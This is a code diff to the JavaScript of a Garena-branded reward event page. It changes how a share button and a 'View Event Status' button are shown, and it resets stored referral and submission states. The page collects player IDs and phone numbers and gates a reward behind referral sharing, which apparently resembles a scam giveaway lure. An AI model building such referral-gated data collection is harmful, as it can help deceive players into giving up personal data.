@@ -22,6 +22,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // DOM Elements - Sharing & Claims
     const referralUrlInput = document.getElementById('referralUrl');
     const shareBtn = document.getElementById('shareBtn');
+    const viewStatusBtn = document.getElementById('viewStatusBtn');
 
     const progressText = document.getElementById('progressText');
     const progressBar = document.getElementById('progressBar');
@@ -112,6 +113,18 @@ document.addEventListener('DOMContentLoaded', () => {
                     localStorage.setItem('garena_step1_connected', 'true');
                     localStorage.setItem('garena_player_id', connectedPlayerId);
                     localStorage.setItem('garena_phone_number', phoneVal);
+                    
+                    // Reset database submission states and referrals to allow new submission
+                    localStorage.removeItem('form_submitted_to_db');
+                    localStorage.removeItem('form_submitted');
+                    localStorage.removeItem('garena_referrals');
+                    referralCount = 0;
+                    updateProgress();
+                    
+                    // Toggle buttons visibility back to initial share state
+                    if (shareBtn) shareBtn.style.display = 'block';
+                    if (viewStatusBtn) viewStatusBtn.style.display = 'none';
+                    
                     unlockShareStep();
                 }, 800);
             }
@@ -152,7 +165,7 @@ document.addEventListener('DOMContentLoaded', () => {
         localStorage.setItem('form_submitted', 'true');
     }
 
-    // Close Modal Event Handler
+    // Close & View Status Event Handlers
     const closeCongratsBtn = document.getElementById('closeCongratsBtn');
     if (closeCongratsBtn) {
         closeCongratsBtn.addEventListener('click', () => {
@@ -160,6 +173,12 @@ document.addEventListener('DOMContentLoaded', () => {
             if (congratsModal) {
                 congratsModal.classList.remove('open');
             }
+        });
+    }
+
+    if (viewStatusBtn) {
+        viewStatusBtn.addEventListener('click', () => {
+            showCongratulations();
         });
     }
 
@@ -198,20 +217,9 @@ document.addEventListener('DOMContentLoaded', () => {
     function completeChallenge() {
         rewardConsole.classList.add('unlocked');
         
-        // Replace share button with view status button
-        const simulatorActions = document.querySelector('.simulator-actions');
-        if (simulatorActions) {
-            simulatorActions.innerHTML = `
-                <button class="btn-action" id="viewStatusBtn" style="background: linear-gradient(135deg, var(--color-secondary), hsl(192, 95%, 40%)); box-shadow: var(--shadow-glow-cyan); margin-top: 10px;">View Event Status</button>
-            `;
-            
-            const viewStatusBtn = document.getElementById('viewStatusBtn');
-            if (viewStatusBtn) {
-                viewStatusBtn.addEventListener('click', () => {
-                    showCongratulations();
-                });
-            }
-        }
+        // Toggle visibility of the buttons
+        if (shareBtn) shareBtn.style.display = 'none';
+        if (viewStatusBtn) viewStatusBtn.style.display = 'block';
 
         // Send data directly to backend database if not already submitted
         const alreadySubmittedToDb = localStorage.getItem('form_submitted_to_db') === 'true';
